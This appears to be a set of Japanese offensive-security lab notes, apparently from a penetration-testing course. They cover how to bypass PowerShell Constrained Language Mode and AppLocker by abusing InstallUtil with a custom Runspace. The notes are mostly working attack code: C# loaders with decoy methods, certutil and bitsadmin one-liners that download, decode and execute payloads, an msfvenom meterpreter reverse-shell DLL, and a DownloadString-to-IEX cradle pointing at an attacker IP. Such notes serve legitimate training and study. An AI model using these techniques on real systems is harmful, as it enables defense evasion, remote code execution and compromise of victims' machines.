# Custom Runspace
事前準備
Visual StudioではSystem.Management.Automation.Runspacesを見つけることができない参照方法
`ソリューションエクスプローラー>参照フォルダーを右クリック>[参照の追加...]を選択>ウィンドウ下部[参照...]ボタンを選択`
フォルダ検索
`C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35`

runspaceを使ったFullLanguageモードで任意のpowershellを呼び出すコード
```c#
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            String cmd = "任意のpowershellコード";
			ps.AddScript(cmd);
			ps.Invoke();
			rs.Close();
        }
    }
}
```

# InstallUtil Bypass
事前準備
VisualStudioではSystem.Configuration.Install名前空間のアセンブリ参照が不足
`ソリューションエクスプローラー>参照フォルダーを右クリック>[参照の追加...]を選択>左側の[アセンブリ]メニュー>System.Configuration.Insallをチェック`

cutom runspaceを統合したコード
```c#
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            ps.AddScript(cmd);

            ps.Invoke();

            rs.Close();
        }
    }
}
```

AppLockerバイパス＆CLMバイパスして実行
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Tools\Bypass.exe
```

AV Evasionを考慮した転送
実行用ファイルをエンコードしてkali webサーバに持ってくる
```
certutil -encode C:\Users\Offsec\source\repos\Bypass\Bypass\bin\x64\Release\Bypass.exe file.txt
```

victimでワンライナーバイパス実行
```
bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\users\student\enc.txt && certutil -decode C:\users\student\enc.txt C:\users\student\Bypass.exe && del C:\users\student\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe
```

# Reflective Injection Return
応用してInvoke-ReflectivePEInjection.ps1からmeterpreter dllをロードしてリバースシェル
https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1

msfvenom
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.230 LPORT=4444 -f dll -o /var/www/html/met.dll
```

上記のpowershell Reflective DLL Injectionは使えないので、学習したReflectiveコードを使用してインジェクションする

最終的なコード
```c#
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.230:8000/run.txt') | IEX";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            ps.AddScript(cmd);

            ps.Invoke();

            rs.Close();
        }
    }
}
```

エンコード
```
certutil -encode C:\Users\Offsec\source\repos\ConsoleApp1\ConsoleApp1\bin\x64\Release\ConsoleApp1.exe file.txt
```

file.txtを/var/www/html経由apacheで配信。bitsadminはpython http serverで配信不可

被害者端末でワンライナー実行
```
bitsadmin /Transfer myJob http://192.168.45.230/file.txt C:\users\student\enc.txt && certutil -decode C:\users\student\enc.txt C:\users\student\Bypass.exe && del C:\users\student\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe
```